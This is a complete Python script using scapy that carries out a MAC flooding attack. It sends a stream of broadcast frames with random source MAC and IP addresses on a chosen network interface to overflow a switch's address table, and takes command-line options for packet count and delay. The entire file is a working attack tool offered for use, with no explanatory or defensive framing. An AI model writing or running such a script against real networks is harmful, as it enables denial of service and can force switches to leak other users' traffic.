#!/usr/bin/env python3
from scapy.all import *
import random
import time

def mac_flood(interface, count=1000, delay=0.01):
    print(f"[+] Starting MAC flooding attack on interface {interface}")
    
    try:
        for i in range(count):
            # Generate random MAC and IP
            rand_mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
            rand_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
            
            # Craft and send packet
            sendp(Ether(src=rand_mac, dst="ff:ff:ff:ff:ff:ff")/IP(src=rand_ip, dst="255.255.255.255"), 
                 iface=interface, verbose=0)
            
            if i % 100 == 0:
                print(f"[+] Sent {i} packets...")
            time.sleep(delay)
            
    except KeyboardInterrupt:
        print("\n[+] Attack stopped by user")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    parser.add_argument("-c", "--count", type=int, default=1000, help="Number of packets to send")
    parser.add_argument("-d", "--delay", type=float, default=0.01, help="Delay between packets")
    args = parser.parse_args()
    
    mac_flood(args.interface, args.count, args.delay)
